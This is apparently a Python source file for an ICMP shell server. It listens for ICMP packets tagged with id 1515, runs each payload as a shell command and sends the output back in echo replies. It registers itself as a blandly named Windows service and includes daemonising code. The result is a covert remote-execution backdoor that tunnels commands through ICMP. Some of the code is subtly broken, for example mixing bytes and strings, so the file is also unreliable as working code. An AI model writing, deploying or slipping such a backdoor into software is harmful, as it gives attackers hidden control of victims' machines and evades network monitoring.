import argparse
import concurrent
import multiprocessing
import os
import socket
import subprocess
import sys
import threading
import time

import servicemanager
import win32event
import win32service
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import sniff, send

import ish_open
import ishell
import win32serviceutil

output = None
error = None


def packet_callback(packet):
    global output
    global error
    if ICMP in packet and packet[ICMP].id == 1515 and packet[ICMP].payload.load.decode('utf-8') != (output or error):
        received_data = packet[ICMP].payload.load.decode('utf-8')
        print("-----+ IN DATA +------")
        print(received_data)
        print("-----+ OUT DATA +-----")
        child_conn, process = ish_open.popen2(received_data)
        ishell.sendhdr.cntrl = 0

        process.stdin.close()

        output = process.stdout.read()
        error = process.stderr.read()

        os.close(child_conn)
        process.communicate()

        string_output = output.decode('cp866').strip()
        string_error = error.decode('cp866').strip()
        print(string_output)
        print(string_error)
        if output == '':
            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (error + "\n")
            send(reply_packet, verbose=False)
        else:
            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / (output + "\n")
            send(reply_packet, verbose=False)


def ish_listen():
    child_conn, process = ish_open.popen2("echo Hello world!")
    ishell.sendhdr.cntrl = 0

    process.stdin.close()

    output = process.stdout.read()
    error = process.stderr.read()

    os.close(child_conn)
    process.communicate()

    print(output.decode('cp866'))
    print(error.decode('cp866'))


def sig_handle():
    return


def child_process():
    sniff(filter="icmp", prn=packet_callback)
    try:
        os.chdir("/")
    except Exception as e:
        print(f"Error changing directory: {e}")

    try:
        os.umask(0)
    except Exception as e:
        print(f"Error setting umask: {e}")

    try:
        with open(os.devnull, 'w') as null_file:
            os.dup2(null_file.fileno(), sys.stdin.fileno())

            os.dup2(null_file.fileno(), sys.stdout.fileno())

            os.dup2(null_file.fileno(), sys.stderr.fileno())

        return 0
    except Exception:
        return -1


def edaemon():
    process = multiprocessing.Process(target=child_process)

    try:
        process.start()
        process.join()
    except Exception:
        sys.exit(-1)


def main():
    ish_debug = 1

    parser = argparse.ArgumentParser(description='ICMP Shell')

    parser.add_argument('-i', help='Назначение идентификатора процесса (диапазон: 0-65535; по-умолчанию 1515)')
    parser.add_argument('-d', help='Запуск сервера в режиме debug', action='store_true')
    parser.add_argument('-t', help='Назначение типа пакетов ICMP (по-умолчанию 0)')
    parser.add_argument('-p', help='Назначение размера пакета (по-умолчанию 512)')

    args = parser.parse_args()

    if args.i:
        ishell.ish_info.id = args.i
    if args.t:
        ishell.ish_info.type = args.t
    if args.p:
        ishell.ish_info.packetsize = args.p
    if args.d:
        ish_debug = 0

    if (ish_debug):
        # if edaemon():
        #    print("Cannot start server as daemon!")
        #    sys.exit(-1)
        sniff(filter="icmp", prn=packet_callback)

    # sniff(filter="icmp", prn=packet_callback)


# class TestService(win32serviceutil.ServiceFramework):
#    _svc_name_ = 'TestService'
#    _svc_display_name_ = 'TestService'
#
#    def __init__(self, args):
#        win32serviceutil.ServiceFramework.__init__(self, args)
#        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
#        socket.setdefaulttimeout(60)
#
#    def SvcStop(self):
#        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
#        win32event.SetEvent(self.hWaitStop)
#
#    def SvcDoRun(self):
#        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE, servicemanager.PYS_SERVICE_STARTED,
#                              (self._svc_name_, ''))
#        self.main()
#
#    def main(self):
#        f = open('D:\\test.txt', 'a')
#        rc = None
#        while rc != win32event.WAIT_OBJECT_0:
#            f.write('Test Service  \n')
#            f.flush()
#            # block for 24*60*60 seconds and wait for a stop event
#            # it is used for a one-day loop
#            rc = win32event.WaitForSingleObject(self.hWaitStop, 24 * 60 * 60 * 1000)
#        f.write('shut down \n')
#        f.close()

class Service(win32serviceutil.ServiceFramework):
    _svc_name_ = "Service"
    _svc_display_name_ = "Service"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, *args)
        self.log('Service Initialized.')
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
        socket.setdefaulttimeout(60)

    def log(self, msg):
        servicemanager.LogInfoMsg(str(msg))

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.log('Service has stopped.')
        win32event.SetEvent(self.stop_event)
        self.ReportServiceStatus(win32service.SERVICE_STOPPED)

    def SvcDoRun(self):
        self.ReportServiceStatus(win32service.SERVICE_START_PENDING)
        try:
            self.ReportServiceStatus(win32service.SERVICE_RUNNING)
            self.log('Service is starting.')
            self.main()
            win32event.WaitForSingleObject(self.stop_event, win32event.INFINITE)
            servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE, servicemanager.PYS_SERVICE_STARTED,
                                  (self._svc_name_, ''))
        except Exception as e:
            s = str(e)
            self.log('Exception :' + s)

    def main(self):
        sniff(filter="icmp", prn=packet_callback)


if __name__ == '__main__':
    # main()
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(Service)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(Service)
